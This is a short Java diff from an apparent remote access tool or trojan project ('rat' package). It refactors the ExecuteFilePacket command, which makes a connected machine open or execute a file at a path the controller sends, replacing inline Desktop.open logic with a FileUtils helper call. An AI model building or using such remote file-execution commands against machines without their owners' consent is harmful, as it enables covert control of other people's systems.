@@ -1,10 +1,6 @@
 package de.sogomn.rat.packet;
 
-import java.awt.Desktop;
-import java.awt.Desktop.Action;
-import java.io.File;
-import java.io.IOException;
-
+import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
 
 public final class ExecuteFilePacket implements IPacket {
@@ -31,21 +27,7 @@ public final class ExecuteFilePacket implements IPacket {
 	
 	@Override
 	public void execute(final ActiveConnection connection) {
-		final boolean desktopSupported = Desktop.isDesktopSupported();
-		final File file = new File(path);
-		
-		if (desktopSupported && file.exists()) {
-			final Desktop desktop = Desktop.getDesktop();
-			final boolean canOpen = desktop.isSupported(Action.OPEN);
-			
-			if (canOpen) {
-				try {
-					desktop.open(file);
-				} catch (final IOException ex) {
-					ex.printStackTrace();
-				}
-			}
-		}
+		FileUtils.executeFile(path);
 	}
 
 }
